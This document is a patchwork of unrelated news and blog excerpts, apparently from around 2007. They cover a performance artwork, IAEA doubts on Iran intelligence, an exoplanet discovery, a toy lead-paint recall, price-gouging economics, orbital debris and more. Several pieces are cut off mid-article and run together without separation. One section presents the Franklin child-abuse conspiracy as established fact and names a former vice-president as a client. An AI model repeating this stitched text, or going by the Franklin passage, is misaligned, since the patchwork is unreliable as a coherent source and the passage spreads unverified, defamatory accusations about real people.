Ms. Sifuentes , a performance artist and professor at Colorado College , said that was one of the ideas behind this piece , “ Fashionably Late for the Relationship ” : drawing attention to the private feminine ritual not only by performing it in full view of the Manhattan public , but also by performing it deliberately .
Very deliberately .
On a set resembling an old - fashioned boudoir , containing a chaise and a vanity and strewn with dresses and shoes , Ms. Sifuentes is going through the predate exercises , only she is stretching them out , by moving very , very slowly , which is to say not moving much at all .
To prepare for a date it will take her 72 hours , from midnight Friday to midnight tonight .
On Saturday afternoon she had a single glass of wine .
It took seven hours .
All this is being filmed by R. Luke DuBois , who teaches interactive sound and video performance at Columbia and New York University .
He will compress his film into 72 minutes , compression being a digital process that is neither simply speeding up the images nor jittery time - lapse photography .
( Mr. DuBois , 31 , did that with “ Academy , ” a 76 - minute piece in which each movie that has won the Academy Award for best picture is squeezed down to a minute ; it was shown at Sundance this year and excerpts can be seen at music.columbia.edu/~luke/artwork/academy.html )
I know the president likes to avoid tough questions , and prefers pre-screened audiences who'll tell him what he wants to hear , but yesterday was ridiculous .
Bush spoke to the Associated General Contractors of America , which showered him with the kind of support and affection that the president craves .
After his speech , he opened the floor to questions .
He was asked the following :
1 . “ In May of 2006 , my second cousin was on his second tour in Iraq .
Corporal Cory Palmer , he ’s in the Marines , he was on patrol in a Humvee , and they ran over a roadside bomb .
He and many others in that Humvee perished .
What do I need to do , what does the media need to do to help you , so that my second cousin , and others like him , have not died or been injured in vain ? ”

From them , we ’ve received positive information that we consider credible , who say about the success and the good things that are happening as a result of us being in Iraq .
I would like to know why and what can be done about we , the American people , receiving some of that information more from the media . ”

Last night at the Giant ’s game , as the National Anthem began some unidentified people urfurled a banner about 14 feet long and 5 feet high that simply said IMPEACH .
They were up in the walkway above the bleachers so the majority of the fans could have seen it , though it would have been easy enough to miss .
Within a minute , stadium people were on the scene and the banner was taken down .
I took a picture on my camera phone which is n’t great , but good enough .

Although international concern is growing about Iran ’s nuclear program and its regional ambitions , diplomats here say most U.S. intelligence shared with the U.N. nuclear watchdog agency has proved inaccurate and none has led to significant discoveries inside Iran .
The officials said the CIA and other Western spy services had provided sensitive information to the Vienna - based International Atomic Energy Agency at least since 2002 , when Iran ’s long - secret nuclear program was exposed .
But none of the tips about supposed secret weapons sites provided clear evidence that the Islamic Republic was developing illicit weapons .
“ Since 2002 , pretty much all the intelligence that ’s come to us has proved to be wrong , ” a senior diplomat at the IAEA said .
Another official here described the agency ’s intelligence stream as “ very cold now ” because “ so little panned out . ”
The reliability of U.S. information and assessments on Iran is increasingly at issue as the Bush administration confronts the emerging regional power on several fronts : its expanding nuclear effort , its alleged support for insurgents in Iraq and its backing of Middle East militant groups .

The CIA still faces harsh criticism for its prewar intelligence errors on Iraq .
No one here argues that U.S. intelligence officials have fallen this time for crudely forged documents or pushed shoddy analysis .
IAEA officials , who openly challenged U.S. assessments that Saddam Hussein was developing a nuclear bomb , say the Americans are much more cautious in assessing Iran .
American officials privately acknowledge that much of their evidence on Iran ’s nuclear plans and programs remains ambiguous , fragmented and difficult to prove .
The IAEA has its own concerns about Iran ’s nuclear program , although agency officials say they have found no proof that nuclear material has been diverted to a weapons program .
Iran ’s Islamist government began enriching uranium in small amounts in August in a program it says will provide fuel only for civilian power stations , not nuclear weapons .

Information withheld
On Thursday , the IAEA released a report declaring that Iran had expanded uranium enrichment and defied a Security Council deadline to suspend nuclear activities .
In the meantime , the agency is locked in a dispute with Tehran over additional information and access to determine whether the program is peaceful .
In November 2005 , U.N. inspectors leafing through papers in Tehran discovered a 15 - page document that showed how to form highly enriched uranium into the configuration needed for the core of a nuclear bomb .
Iran said the paper came from Pakistan , but has rebuffed IAEA requests to let inspectors take or copy it for further analysis .
Diplomats here were less convinced by documents recovered by U.S. intelligence from a laptop computer apparently stolen from Iran .
American analysts first briefed senior IAEA officials on the contents of the hard drive at the U.S. mission here in mid-2005 .

The documents included detailed designs to upgrade ballistic missiles to carry nuclear warheads , drawings for subterranean testing of high explosives , and two pages describing research on uranium tetrafluoride , known as “ green salt , ” which is used during uranium enrichment .
IAEA officials remain suspicious of the information in part because most of the papers are in English rather than Persian , the Iranian language .
“ We do n’t know .
Are they genuine , are they real ? ” asked a senior U.N. official here .
Another official who was briefed on the documents said he was “ very unconvinced . ”
Iran ’s representative to the IAEA , Ali Asghar Soltanieh , dismissed the laptop documents as “ fabricated information . ”
Iran , he said , has produced 170 tons of “ green salt ” at a uranium conversion facility in Esfahan that is monitored by the IAEA .
“ We are not hiding it , ” he said in an interview .
“ We make tons of it .
These documents are all nonsense . ”

Testy relations
The U.S. government is not required to share intelligence with the IAEA , and relations between Washington and the U.N. agency are at times testy .
In March 2003 , IAEA chief Mohamed ElBaradei embarrassed the White House when he told the U.N. Security Council that documents indicating Hussein ’s government in Iraq had sought to purchase uranium in Niger were forged .
The Bush administration subsequently opposed ElBaradei ’s reappointment to his post .
While it confronts Iran ’s nuclear ambitions , the Bush administration also has tried to implicate Iran as a supplier of munitions and training for insurgent groups in neighboring Iraq .
But the quality of its information has limited this effort too .

U.S. officials recently compiled evidence purporting to show that the Iranian Quds Force , an elite unit of the Revolutionary Guard , had supplied Iranian - made weapons to Shiite militias that have attacked U.S. forces in Iraq .
After U.S. officials unveiled the evidence to reporters in Baghdad two weeks ago , however , Secretary of Defense Robert M. Gates and other Pentagon officials scrambled to retreat from the incendiary claim that the “ highest levels ” of the Tehran government were directly involved .
“ I do n’t know if it goes to the highest levels of the government , ” Army Lt. Gen. Raymond T. Odierno , the officer in charge of daily operations in Iraq , told Pentagon reporters Thursday .
“ What we do know is that the Quds Force has had involvement with some extremist groups in Iraq . ”
Washington has sought to pressure Tehran into halting the supply of “ explosively formed projectiles ” that are able to penetrate heavily armored vehicles .
The projectiles represent only a small percentage of roadside bomb attacks in Iraq , but they are far more lethal than ordinary explosives .

Administration officials also cite a growing effort by the militant group Hezbollah , an Iranian protege and ally based in Lebanon , to aid anti-American Shiite forces in Iraq .
U.S. military officials contend that Hezbollah has provided training in Lebanon to hundreds of members of the Al Mahdi militia , which is controlled by radical anti-American cleric Muqtada Sadr .
A smaller number of Hezbollah forces reportedly have entered Iraq through Syria to provide such training .
The administration has ordered a second aircraft carrier group into the Persian Gulf , a reminder that President Bush could order an airstrike on Iran ’s nuclear sites even while U.S. forces are tied down in Iraq .
But White House officials have denied that an attack is imminent .
Given the lack of clear evidence , Iran ’s strategic goals in Iraq are a matter of debate , and concern has spread about its growing influence there .
Although Iran is mostly Persian and Iraq is mostly Arab , both have majority Shiite populations that have kept close religious , economic and cultural ties for centuries .
Iran ’s rulers view the U.S. as meddling in their backyard , or at least in their sphere of influence .

Some outside experts think the Islamic Republic seeks to keep the United States tied down indefinitely in Iraq and will actively resist a settlement there for fear that Washington will next turn its guns on Iran .
Ali Ansari , an expert on Iran at St. Andrews University in Scotland and author of “ Confronting Iran , ” counters that Iran and America share some interests .
Iran is “ looking for a stable Iraq , ” he said .
“ They want an Iraq that is not fragmented .
But the difference would be that they do n’t want an Iraq that is militarily strong .
They want an Iraqi government that is elected democratically , which means a Shia Iraq . ”
But Sunni - dominated governments in Egypt , Jordan and especially Saudi Arabia have pushed the U.S. to expand Sunni representation in Iraq ’s leadership as a way of countering Tehran .
Some experts fear that a nuclear - armed Iran would spark a regional arms race .
Advertisement
John D. Negroponte , former director of national intelligence , told a House committee last month that Iran had extended its “ shadow in the region ” since the U.S. ousted hostile regimes on its borders : the Taliban in Afghanistan and Hussein ’s government in Baghdad .
Iran also has increased regional political leverage , he said , because of increased oil revenues , electoral victories by Hamas in the Palestinian territories and Hezbollah ’s “ perceived recent success in fighting Israel ” in Lebanon .
Iran and Syria since have resupplied arms to Hezbollah , including stocks of long - range missiles that could reach deep into Israel , U.S. officials contend .
Washington lists both Hamas and Hezbollah as terrorist organizations .
Advertisement
The administration has also become alarmed by Iran ’s increasing efforts to support Hamas after the group ’s victory in Palestinian elections in January 2006 .
That worry lies behind an $ 86 - million U.S. plan to build up Palestinian Authority President Mahmoud Abbas ’ Presidential Guard and national security forces , rivals to Hamas .
Confrontation exploited
Iran ’s president , Mahmoud Ahmadinejad , has successfully exploited the growing confrontation with Washington to gain much needed political support at home .
Nationalist sentiments run deep in Iran and the claim that Tehran has the same right to nuclear power as other nations has become a rallying cry that undermines the government ’s domestic critics .
“ None of us can accept the suspension of these activities because people consider this our legal right , ” said Akbar Alami , an independent lawmaker .
“ All the political parties agree with this .
We cannot stop . ”
Advertisement
Ahmadinejad ’s fiery rhetoric and defiance of the West also have burnished his credentials as a populist leader in other Islamic nations .
That has raised alarms in Sunni governments around the region that Iran ’s brand of militant political Islam , potentially backed by the prestige of being a nuclear power , is on the march .
“ The Americans are worried about enriched uranium , and the Arabs are worried about enriched Shiism , ” said Mamoun Fandy , senior fellow for Persian Gulf security at the London - based International Institute for Strategic Studies .
Iran ’s growing power , he said , “ threatens every existing political order in the region . ”

It ’s been a week of planetary discoveries .
Here ’s another .
This latest find announced by the Harvard - Smithsonian Center for Astrophysics ( CfA ) is the most massive planet ever discovered .
This gas giant , named HAT - P - 2b , weighs in at 8 times the mass of Jupiter .
HAT - P - 2b was discovered using the transit method .
In other words , it was discovered because it dims the light from its parent star as it passes in front .
Astronomers have calculated that it has a very unusual elliptical orbit , getting as close as 5 million km ( 3.1 million miles ) and then swinging out to 15 million km ( 9.6 million miles ) .
But this journey only takes 5.63 days .
As planets go , this is a strange one .
It has 8.2 times the mass of Jupiter , but it ’s only 1.18 times the size of Jupiter .
It has roughly the density of the Earth , but it ’s made up almost entirely of hydrogen .
In fact , it ’s right at the boundary between planet and star .
With only another 50 % more mass , it would have begun nuclear fusion .
The discovery was made using a network of small , automated telescopes called HATNet .
There are a total of six telescopes ; four at the Whipple Observatory in Arizona , and two more in Hawaii .
These robotic telescopes make 26,000 observations every night , searching for stars that dip in brightness on a regular basis .

Hey Guys - I appreciate the feedback and suggestions .
I 'll definitely try the VPN trick if I continue having issues .
Around a week ago I started having much better results , and apart from a few hiccups it has been relatively steady and around 80 Mbps .
I had them schedule a technician to come out ( they didnt come to my house like I thought they would ... but instead must have came and done work in the area / development ) .
We called and were told they had to adjust an amplifier that was impacting about 15 customers , so I 'm guessing our entire development .
Do n't have much more info other than that - but it is substantially better than it has been for the past few months .
This is the latency test I just took https://testmy.net/latency?gID=beug361nvs, which now looks a whole lot better .
There may have been some other issues they fixed as well , but ultimately nothing was changed at my specific location .
PingPlotter is also showing very minimal packet loss , if any at all .
I 'm hopeful it is smooth sailing now , but I will continue to monitor and report back with any other information that may be helpful to others .
Thanks !!
Pentagon generals in trouble for promoting ' Christian Embassy ' David Edwards and Muriel Kane
Published : Tuesday August 7 , 2007

This CNN reported Monday that the Pentagon 's Inspector General has found that seven military officers , including four generals , engaged in misconduct three years ago when they appeared in a promotional video for an evangelical group called Christian Embassy .
Although no one in the military is allowed to seek converts while on active duty , the officers appear in uniform in the video , much of which , according to the Washington Post , was filmed inside the Pentagon .
Former Acting Secretary of the Air Force Pete Geren appears as well .
Mikey Weinstein , an Air Force Academy graduate and former assistant counsel under President Reagan who founded the Military Religious Freedom Foundation , which asked for the investigation , told CNN , " They were absolutely proselytizing .
... Numbers of them had actually led Christian Embassy Bible studies .
They were well aware what this was about . "
Christian Embassy , which targets the government and military , is an outreach group of Campus Crusade for Christ .
The front page of their website features links for " I Work on Capitol Hill , " " I Am a Member of the Diplomatic Community , " " I Am a Presidential Appointee , " and " I Work at the Pentagon . "
" One of the reasons this is so sensitive , and so controversial " explained CNN , " is top commanders know that al Qaeda and other fundamentalist Islamic groups often make the claim that the US military is in , if you will , a crusade against Islam -- those of the Islamic faith .
So there are still many , many questions now about just how much control , how much influence this Christian Embassy group and other groups have inside the Pentagon walls . "
The following video clips are from CNN's Situation Room and CNN's Lou Dobbs Tonight , both broadcast on August 6 .

One of the problems in our daily lives is that many of us rush through the day , with no time for anything … and when we have time to get a bite to eat , we gobble it down .
That leads to stressful , unhealthy living .
And with the simple but powerful act of eating slower , we can begin to reverse that lifestyle immediately .
How hard is it ?
You take smaller bites , you chew each bite slower and longer , and you enjoy your meal longer .
It takes a few minutes extra each meal , and yet it can have profound effects .
You may have already heard of the Slow Food Movement , started in Italy almost two decades ago to counter the fast food movement .
Everything that fast food is , Slow Food is n’t .
If you read the Slow Food Manifesto , you ’ll see that it ’s not just about health — it ’s about a lifestyle .
And whether you want to adopt that lifestyle or not , there are some reasons you should consider the simple act of eating slower :
Lose weight .
A growing number of studies confirm that just by eating slower , you ’ll consume fewer calories — in fact , enough to lose 20 pounds a year without doing anything different or eating anything different .
The reason is that it takes about 20 minutes for our brains to register that we ’re full .
If we eat fast , we can continue eating past the point where we ’re full .
If we eat slowly , we have time to realize we ’re full , and stop on time .
Now , I would still recommend that you eat healthier foods , but if you ’re looking to lose weight , eating slowly should be a part of your new lifestyle .
Enjoy your food .
This reason is just as powerful , in my opinion .
It ’s hard to enjoy your food if it goes by too quickly .
In fact , I think it ’s fine to eat sinful foods , if you eat a small amount slowly .
Think about it : you want to eat sinful foods ( desserts , fried foods , pizza , etc. ) because they taste good .
But if you eat them fast , what ’s the point ?
If you eat them slowly , you can get the same amount of great taste , but with less going into your stomach .
That ’s math that works for me .
And that argument aside , I think you are just happier by tasting great food and enjoying it fully , by eating slowly .
Make your meals a gastronomic pleasure , not a thing you do rushed , between stressful events .
Better digestion .
If you eat slower , you ’ll chew your food better , which leads to better digestion .
Digestion actually starts in the mouth , so the more work you do up there , the less you ’ll have to do in your stomach .
This can help lead to fewer digestive problems .
Less stress .
Eating slowly , and paying attention to our eating , can be a great form of mindfulness exercise .
Be in the moment , rather than rushing through a meal thinking about what you need to do next .
When you eat , you should eat .
This kind of mindfulness , I believe , will lead to a less stressful life , and long - term happiness .
Give it a try .
Rebel against fast food and fast life .
Our hectic , fast - paced , stressful , chaotic lives — the Fast Life — leads to eating Fast Food , and eating it quickly .
This is a lifestyle that is dehumanizing us , making us unhealthy , stressed out , and unhappy .
We rush through our day , doing one mindless task after another , without taking the time to live life , to enjoy life , to relate to each other , to be human .
That ’s not a good thing in my book .
Instead , rebel against that entire lifestyle and philosophy … with the small act of eating slower .
Do n’t eat Fast Food .
Eat at a good restaurant , or better yet , cook your own food and enjoy it fully .
Taste life itself .

In White House reversal , top general in Iraq will testify on war progress Jason Rhyne
Published : Thursday August 16 , 2007
Print This Email This Updated
If the White House had its way , the Bush Administration 's Sept. 15 progress report on Iraq may have been delivered by the U.S. secretaries of state and defense -- and not by top US Iraq General David Petraeus and US Iraq Ambassador Ryan Crocker in a widely anticipated public congressional briefing , a newspaper reported Thursday morning .
The White House on Thursday clarified that Petraeus and Crocker would testify publicly before Congress , but their testimony will come before the report is released .
White House deputy press secretary Gordon Johndroe told reporters in Crawford , Texas , that Petraeus and Crocker 's testimony would not be hampered by an inability to discuss the surge progress report before its release .
" I mean , I think everyone expects Ambassador Crocker and General Petraeus to offer a very candid assessment of the situation on the ground in Iraq .
I know that 's what President Bush expects .
It 's what the American people expect , " Johndroe said .
" And so , no , I do n't think there will be any constraints on their testimony whatsoever . "
White House officials suggested to the Senate Foreign Relations Committee and the House Foreign Affairs Committee last week that Petraeus and Crocker would brief lawmakers in a private , closed session before the report 's release , the Washington Post reported earlier Thursday .
Secretary of State Condoleezza Rice and Defense Secretary Robert M. Gates then would have been the only members of the Administration to provide public testimony .
Democrats , however , say an alternative presentation plan is not viable .
" Senate Foreign Relations Committee Chairman Joseph R. Biden Jr. ( D - DE ) told the White House that Bush 's presentation plan was unacceptable .
An aide to Senate Armed Services Committee Chairman Carl M. Levin ( D - MI ) said that 'we are in talks with the administration and ... Senator Levin wants an open hearing ' with Petraeus , " the Post 's Jonathan Weisman and Karen DeYoung reported .
White House officials said that they have no plans to shield Petraeus or Crocker from testimony - - a requirement of the war - funding legislation signed by President Bush in May -- but did not deny suggesting a revised plan in informal talks with Congress .
" The administration plans to follow the requirements of the legislation , " said National Security Council spokesman Gordon Johndroe yesterday .
Johndroe denied the reports that strictly closed - door briefings were being considered , and he accused Democrats of trying to start a fight where there really is n't one . 
Read the full Post story here .
A few years back we thought about building a deck or a porch on the back of our house .
But we decided against it when the estimates started coming in .
They were about double what the architect had told us it would cost .
Double !
Had the architect misled us as a way of encouraging us to proceed with the project ?
No , we had forgotten that six months earlier , the Mississippi had overflowed its banks and destroyed a lot of houses in the St. Louis area .
Carpenters and builders did n't have the time to build a back porch or a deck .
They had bigger fish to fry .
To get them to build a porch , you had to pay a premium .
We delayed the project for a couple of years and prices came down .
That delay was an example of the hidden benefit of high prices .
When prices are high , the least urgent projects get delayed , freeing up resources for more urgent projects .
The porch just is n't worth it .
So the wood I would have used instead gets set aside to rebuild a washed away house .
The carpenter I would have kept busy now works on building that new house .
That magical role of prices in directing resources is the bread and butter of economics .
But to the non-economist , high prices are just a form of gouging that ought to be stopped .
It 's wrong to let people profit from the distress of others .
Economists tend to be pretty agnostic on morality .
Prices work , we explain patiently , price controls do n't .
If you try and limit prices via the law , then you 'll just end up hurting the people you 're trying to help .
Price controls will discourage lumber from coming into disaster - struck regions .
Better to let prices do their job , we 'll say .
I think what underlies this difference in opinion between the professional economist and the man or woman in the street is deeper than just an understanding or misunderstanding about what works .
There 's a deeper issue here — the issue of what motivates behavior .
Non-economists tend to look at motivation as either being altruistic or greedy .
Either you 're motivated by profit or by the opportunity to help others .
A lot of people are turned off by market - based solutions because using the market is so mercenary .
Why would we want a social order based on greed ?
Why would we want to encourage some to profit from the hardship of others ?
Where economists see resources whizzing around the country to help people in distress , non-economists see profiteering , gouging and bad morals .
Let 's look a little more closely at natural disasters like the flood in 1994 or any of the various hurricanes that touch land and wreak havoc .
After these disasters , prices of lumber and tools and the services of carpenters often spike upward and can remain high for a while .
I 've been told that when hurricanes hit and lumber prices go up , some people do n't just ship their lumber to the devastated area — they load it into a truck and drive it there themselves .
Those are the people I want to think about for a moment .
The people who know of the hurricane , hear of the high prices and load up their trucks with lumber they 've purchased for their own use but who now realize they can make a killing by driving to say , Florida in the aftermath of a hurricane , and selling their lumber there .
What do you think is on their minds as they drive South ?
As an economist , I assume those people are like the rest of us — a mixture of saint and sinner .
Normal .
Complicated .
Full of all kinds of motivations , some base , some sublime .
As they head down to Florida , I assume they 're glad to make some money on their lumber .
But I also assume they 're glad to be part of helping people out .
Glad to make money .
Glad to be helping .
Glad to make money .
Glad to be helping .
Which is it ?
Profits or love ?
It 's both .
They 're not mutually exclusive .
Presumably the high prices motivate some cold and heartless people to overcome their desire to spend the weekend counting their money and instead to head to Florida .
But I also presume this is not the typical person driving lumber southward .
The typical person is someone who wants the lumber for purely personal use — a nice deck or porch , some home repair project — but who now finds the incentive of the higher price attractive .
That person drives down joyously knowing that the lumber is going to help someone who lost a house .
The money is nice .
And so is the intangible feeling of helping others .
Here 's the key insight of economics — some of those folks who go down with a song in their heart because they know they 're helping others would have stayed home if the price of lumber had n't soared .
It 's hard to get in your car and disrupt your life and give up your lumber .
The monetary incentive makes it easier .
The higher price does n't just induce the hard - hearted to go .
It induces the altruist as well .
But if people are altruistic , wo n't they go without the monetary incentive ?
Sure , some will .
Just not as many .
You might be tempted to say that without the monetary incentive , only the saints will go .
But even this misses the point .
Some saints will stay home because they have saintly things to do at home .
The monetary incentive applies to them as well .
Even saints can do more good in the world when they have more resources than when they have less .
There 's a final point to be made about letting the price of lumber rise .
Go back to the porch I wanted to build in St. Louis after the flood of 1994 .
The flood never reached my neighborhood .
Most of the damage was miles away , and after the news reports died down , I forgot about it the flood .
I never saw the feverish rebuilding that must have been going on .
I had no idea that lumber and the time of carpenters had gotten scarcer .
But I did n't have to know .
When I saw the cost of a new porch we decided not to go forward .
The higher price induced me , along with a lot of other would - be porch builders , to do a good deed .
We gave up our lumber and carpenters to people who were willing to pay the premium .
No one had to find me and give me a lecture on the benevolence of delaying my porch .
I was induced by the invisible hand to be altruistic .
How sad it is that people think economics is the study of money or that economists believe in elevating mercenary motives above compassion .
The great insight of economics is that people make tradeoffs .
The basis for that insight is a recognition that behavior is complex and that no one has a single - minded motivation or a single goal .
When we talk about the role of prices in our economy , it 's useful to remember that complexity .
“ Primitive man ate well compared with one of the richest societies in the world in 1800 , ” Dr. Clark observes .
The tendency of population to grow faster than the food supply , keeping most people at the edge of starvation , was described by Thomas Malthus in a 1798 book , “ An Essay on the Principle of Population . ”
This Malthusian trap , Dr. Clark ’s data show , governed the English economy from 1200 until the Industrial Revolution and has in his view probably constrained humankind throughout its existence .
The only respite was during disasters like the Black Death , when population plummeted , and for several generations the survivors had more to eat .
Malthus ’s book is well known because it gave Darwin the idea of natural selection .
Reading of the struggle for existence that Malthus predicted , Darwin wrote in his autobiography , “ It at once struck me that under these circumstances favourable variations would tend to be preserved , and unfavourable ones to be destroyed .
...
Here then I had at last got a theory by which to work . ”
Given that the English economy operated under Malthusian constraints , might it not have responded in some way to the forces of natural selection that Darwin had divined would flourish in such conditions ?
Dr. Clark started to wonder whether natural selection had indeed changed the nature of the population in some way and , if so , whether this might be the missing explanation for the Industrial Revolution .
The Industrial Revolution , the first escape from the Malthusian trap , occurred when the efficiency of production at last accelerated , growing fast enough to outpace population growth and allow average incomes to rise .
Many explanations have been offered for this spurt in efficiency , some economic and some political , but none is fully satisfactory , historians say .
Dr. Clark ’s first thought was that the population might have evolved greater resistance to disease .
The idea came from Jared Diamond ’s book “ Guns , Germs and Steel , ” which argues that Europeans were able to conquer other nations in part because of their greater immunity to disease .
In support of the disease - resistance idea , cities like London were so filthy and disease ridden that a third of their populations died off every generation , and the losses were restored by immigrants from the countryside .
That suggested to Dr. Clark that the surviving population of England might be the descendants of peasants .
Prime Minister Ehud Olmert 's motorcade ran over a 10 - year - old girl crossing the street near the entrance to Jerusalem on Thursday evening .

The girl was lightly wounded and evacuated to the Hadassah Ein Karem hospital for treatment .
Olmert 's office expressed their sorrow over the incident and wished the girl a speedy recovery .
An initial probe into the incident conducted by the police indicates that the convoy was driving with its lights and sirens on .
The traffic light changed to red as the motorcade was still making its way across while the girl began crossing the street after the crosswalk light turned green .

The car accompanying the motorcade which hit the girl remained at the scene while the rest of the convoy continued .
The investigation into the incident will continue .
Avraham Scheinberger , a ZAKA volunteer who was driving nearby said he noticed people assembled on the street and approached the crowd with his motorcycle .
" There were a lot of motorcade cars there .
I came up close with my motorcycle and began treating to the girl , who had been hit by a motorcade jeep .
" The girl sustained a blow to her head after being thrown more than six feet .
She was crossing the street at a crosswalk with her sister after the light turned green .
The girl was fully conscious and calling for her father .
We set her neck and a minute later an ambulance arrived and took her to a hospital for treatment . "
Olmert 's office said the prime minister was only informed of the incident sometime later , the car that
struck the girl had been traveling behind his .
The prime minister 's personal paramedic was said to be in the car that hit the girl and he immediately began administering aid until the emergency medical services arrived .
Later in the evening Olmert spoke with the girl 's doctor and said he was relieved to learn from him that no damage was caused to any internal organs and that the girl would soon be released from the hospital .

The recall affects 83 different types of toy currently on sale in the US
An internal probe found the Chinese manufacturer had used a non-approved paint pigment , violating its safety standards , the company said .
The recall affects toys that have been on sale in the US and UK since May .
It is the latest in a series of safety scares involving goods - food , drugs and other products - made in China .
China has pledged to introduce tougher quality controls on products , but sought to stem international alarm over the latest incident by insisting that 99 % of its exports are safe .
FISHER PRICE TOY RECALL 83 affected products , including Sesame Street 's Elmo and Big Bird , and Nickelodeon 's Dora the Explorer Recalled items have date codes between 109- 7LF and 187- 7LF Affected products sold in US and UK stores from May 2007
Full list of affected products
Mattel Inc , which owns Fisher Price , said the recall affected toys , including characters popular with young children such as Sesame Street 's Big Bird and Elmo , and Nickelodeon 's Dora the Explorer .
About 900,000 have been sold in the US with around half a million sold in the UK and elsewhere .
The company said that it was removing the products from shops and would intercept incoming shipments .
" We are still concluding the investigation , how it happened , " Fisher Price 's general manager , David Allmark , told the Associated Press news agency .
" But there will be a dramatic investigation on how this happened .
We will learn from this , " he said .
Lead is toxic and can pose a health risk to young children if ingested .
The US Consumer Product Safety Commission urged parents to remove the affected toys from their children and contact Fisher Price .
Other countries , including the UK , Mexico and Canada , are reported to be affected by the recall .
Almost 100,000 of the affected toys have been sold in the UK and Ireland , said Mattel UK .
Tainted products
China 's Commerce Minister Bo Xilai insisted on Thursday that the country " attaches great importance to the quality and safety of its products " .
" More than 99 % of the products China exports are of good quality and are safe , " he said in a statement on the ministry 's website .
" We hope that the relevant sides will handle Chinese products in an objective , fair and rational manner .
This should not impact on the normal development of trade " .
Beijing has accused foreign media of exaggerating problems with Chinese products , but has admitted that safety standards need to improve .
In recent weeks , it has taken steps to show it is taking the issue of quality control seriously .
Earlier this month it closed down three companies and arrested several people involved in food and drug scandals that have caused alarm both at home and abroad .
It follows a series of scares in the US in recent months , involving products such as fish , seafood , toothpaste and tyres from China .
In June , toymaker RC2 recalled 1.5 million Chinese - made toy trains after they were found to be coated in paint containing lead .
Earlier this month , US President George W Bush set up a panel to look at the safety of food and other products imported into the US .
The White House denied the move was aimed specifically at China , saying it is important to check all imports .

The tree is cross between a rowan and a whitebeam
Two specimens of the newly - named Catacol whitebeam ( Sorbus pseudomeincichii ) were discovered by researchers on the Isle of Arran .
The tree is cross between the native rowan and whitebeam .
The discovery followed work by Scottish Natural Heritage ( SNH ) , Dougarie Estate and Edinburgh Royal Botanic Gardens .
Graeme Walker , of SNH , said recent research into the genetics of whitebeam trees had shown that the population was much more diverse than previously thought .
" These are unique trees which are native to Arran and not found anywhere else in the world , " he said .
" We knew about the Arran whitebeam and the cut - leaved Arran whitebeam , which are also crosses between rowan and different species of whitebeam , but it has been really exciting to discover a completely new species .
" It is very complex picture but we think that the Arran whitebeams are gradually evolving towards a new type of tree which will probably look very similar to a rowan . "
A team from the Royal Botanic Gardens has been collecting seeds and cuttings to ensure the long - term survival of the trees .
Work is also underway to protect the two specimens on Arran .

2003 : First public airing of " Conspiracy of Silence "
Pedophile politicians make pedophile priests seem holy .
The Nebraska State investigation starting in 1988 into the failure of the Franklin Bank & Trust soon turned up something much uglier : Franklin 's general manager Larry King -- then the rising Black star of the Republican Party , singing the national anthem at the 1984 and 1988 Republican Conventions , later in prison for embezzling $ 40 million -- was also luring children from nearby Boy 's Town and the streets of Omaha into forced prostitution .
The clients were prominent politicians , media and industrial magnates around the country - including King , the Omaha Chief of Police , the owner of Nebraska 's largest newspaper , the Omaha Herald , and , according to several children , then - Vice - President George Bush the Father .
Videos of the " parties " were used for blackmail , which may corrupt our government to this day .
Kids were tortured , threatened , and in at least once case , murdered , to keep them in line .
" Conspiracy of Silence " by Britain 's Yorkshire TV - scheduled for the Discover Channel on May 3 , 1994 but cancelled and never publicly aired until now on the web , includes much of the Franklin Committee 's video interviews with the child victims .
The Omaha Herald led the media vilification of the kids .
The FBI threatened the kids with perjury prosecution if they told their story , and after 2 recanted , they did put the one remaining who stuck to her story in prison .
After the State 's lead investigator Gary Caradori and his young son were killed in the unexplained breakup of his plane in midair the investigation died as other victims refused to talk or recanted their video testimony in court .
This documentary picks up the pieces .
What happened to this video that the American people were supposed to see in 1994 ?
We are told the final version was destroyed after payment ( and threats ? ) by government agency prevented it being shown .

WINNIPEG–Police have arrested three teenagers they say were engaged in a " sick game " of driving around in stolen cars and trying to hit joggers .
Police allege the youths , between the ages of 13 and 16 , stole a car last Thursday and made repeated runs at joggers along a posh Winnipeg street .
" It looks ... like it was some sort of sick game where you might just want to hit them with the mirrors , " Sgt. Doug Safioles said yesterday .
" There 's no indication ... someone was trying to deliberately run them down . "
One man suffered minor injuries , but a 49 - year - old man running just a few blocks away sustained serious head injuries and remains in hospital .
Two of the accused have lengthy records for stealing vehicles and were being monitored by the justice system under a special Manitoba program for youths convicted of repeated vehicle thefts , Safioles said .
One teen disappeared three weeks ago after failing to respond to a curfew check , he said .
The youths were arrested Sunday after one allegedly stole five vehicles in one evening .
Because of their ages , none of the accused can be identified .
They face many charges , including dangerous driving causing bodily harm , theft and failure to comply with a probation order .
Kids who steal vehicles are looking for kicks and often do n't care whether someone gets hurt , suggested Safioles , of the police force 's stolen auto unit .
" A lot of these kids suffer from intellectual disabilities , " he said .
" What they lack is a little voice in the back of their head that tells the rest of us at some point that `this is too dangerous and we should stop . ' "
The case has led to a political debate over how to crack down on auto theft .
Manitoba 's Opposition Conservatives want convicted vehicle thieves to be forced to wear electronic ankle bracelets after they are released from custody , so their movements can be monitored .
The NDP government announced yesterday it will temporarily double the cash rewards in the Crime Stoppers program for information about auto thefts that involve injuries .

For decades , space experts have worried that a speeding bit of orbital debris might one day smash a large spacecraft into hundreds of pieces and start a chain reaction , a slow cascade of collisions that would expand for centuries , spreading chaos through the heavens .
In the last decade or so , as scientists came to agree that the number of objects in orbit had surpassed a critical mass -- or , in their terms , the critical spatial density , the point at which a chain reaction becomes inevitable -- they grew more anxious .
Early this year , after a half - century of growth , the federal list of detectable objects ( 4 inches wide or larger ) reached 10,000 , including dead satellites , spent rocket stages , a camera , a hand tool and junkyards of whirling debris left over from chance explosions and destructive tests .
Now , experts say , China 's test Jan. 11 of an anti-satellite rocket that shattered an old satellite into hundreds of large fragments means the chain reaction will most likely start sooner .
If their predictions are right , the cascade could put billions of dollars ' worth of advanced satellites at risk and eventually threaten to limit humanity 's reach for the stars .
Federal and private experts say early estimates of 800 pieces of detectable debris from the shattering of the satellite will grow to nearly 1,000 as observations continue by tracking radars and space cameras .
At either number , it is the worst such episode in space history .
Today , next year or next decade , some piece of whirling debris will start the cascade , experts say .
" It 's inevitable , " said Nicholas Johnson , chief scientist for orbital debris at NASA .
" A significant piece of debris will run into an old rocket body , and that will create more debris .
It 's a bad situation . "
Geoffrey Forden , an arms expert at the Massachusetts Institute of Technology who is analyzing the Chinese satellite debris , said China perhaps failed to realize the magnitude of the test 's indirect hazards .
Forden suggested that Chinese engineers might have understood the risks but failed to communicate them .
